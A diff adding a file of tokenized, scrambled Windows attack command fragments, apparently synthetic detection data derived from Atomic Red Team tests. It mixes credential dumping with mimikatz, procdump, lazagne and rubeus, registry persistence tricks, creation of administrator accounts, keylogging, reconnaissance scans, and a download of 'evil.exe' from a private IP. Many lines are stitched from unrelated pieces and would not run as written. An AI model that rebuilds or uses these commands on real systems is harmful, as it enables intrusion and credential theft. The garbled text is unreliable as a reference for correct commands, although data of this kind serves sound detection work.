@@ -1,0 +1,64 @@
+`` $ shell = new-object net.webclient \\ set within buildnumber , -classname * from win32_pnpentity where ( pnpclass ' ) 'https : ' $ a ) ; querylanguage= $ : \system\currentcontrolset\services\winsock2\parameters -name ) from art player : -- -- ' set *
+hostname
+adfind.exe localappdata % \microsoft\teams\current\teams.exe
+sharprdp.exe computername= $ { filename_regex }
+.\procdump.exe -accepteula hklm\security\policy\secrets % \system32\osk.exe
+get-keystrokes
+get-keystrokes
+invoke-mimikatz.exe
+namp -sn -l $ { filename_regex }
+bitsadmin.exe /setnotifycmdline $ { input_folder_name }
+sekurlsa : -r /user : cor_profiler -name administrators '' $ { .\lazagne volumn /d $ { hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam ;
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest `` `` '' '' `` cor_profiler '' /t reg_dword /success : true
+reg query 512
+cmdkey /list
+net user administrator /add
+net localgroup administrators `` @ `` cor_enable_profiling
+net user = `` ip
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon execution file :logonpasswords
+namp -sn $ { filename_regex } > $ commandline
+ffuf -w $ env : -p @ $ { target @ { copy volumn name you `` administrators = keylog
+psr.exe /start /output $ { components\atomic_test /f
+lazagne.exe windows
+reg query
+quser
+namp -sn -l $ { volumn you shell.createshortcut administrators = `` '' % windir % \system32\osk.exe
+net user administrator /add
+bypassuac.exe $ : cor_profiler -command $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net `` hkey_local_machine\software\microsoft\windows \inprocserver32 , keylog
+del % windir % file % components\atomic_test % \system32\osk.exe /grant administrators : = `` keylog
+reg.exe add `` powershell `` 7 tmp.run `` http : //192.168.1.29:9000/payload/evil.exe , http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net user administrator /add
+reg query hklm\software\microsoft\provisioning\commands\lolbin\dummy1\dummy2 user
+subfinder -d `` $ target )
+net user `` $ shadow ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 /add
+get-ciminstance -classname win32_operatingsystem `` cscript $ i -l $ ( `` `` hkey_local_machine\system\currentcontrolset\control\lsa '' `` $ : volumn \users\ }
+rubeus.exe kerberoast /export `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` cor_profiler ''
+gobuster dir -u $ wscriptshell.createshortcut `` inprocserver32 '' ;
+net localgroup administrators
+ffuf -w $ consumerargs
+get-ciminstance -classname win32_operatingsystem select-object -expandproperty username
+esentutl.exe /y $ { hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam : disable
+$ consumer=set-wmiinstance -namespace `` '' '' `` cor_profiler '' c : cor_profiler execution team ''
+net localgroup administrators `` `` cor_profiler
+net localgroup administrators `` @ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins )
+quser
+namp -sn $ filterargs
+copy `` hkey_local_machine\system\currentcontrolset\control\session os -name env /l ;
+net localgroup administrators `` @ `` $ { output_zip_name } @ `` $ { user_name }
+net localgroup administrators $ { output_zip_name }
+rundll32 popcalc.dll , keylog
+net localgroup administrators @ `` '' `` '' t1547.009 ; /user : @ `` $ { filter = `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest = `` threadingmodel -name `` threadingmodel -name `` start-process `` inprocserver32 '' -name $ { system32_binary '' ''
+ffuf -w $ consumerargs
+quser
+net localgroup administrators `` @ `` `` $ filterargs
+net group `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v reg_dword /d `` threadingmodel
+`` powershell `` foreach-object : -logname `` : :logonpasswords
+namp -sn -l $ target ) ;
+net localgroup `` administrators `` bits_job_name } \inprocserver32 '' `` keylog
+net group `` domain c : \users\
+net group `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_sz /d `` driver /f
+ffuf -w $ consumerargs
+net accounts
+net `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam `` cor_profiler ''
+net localgroup administrators `` @ : cor_profiler
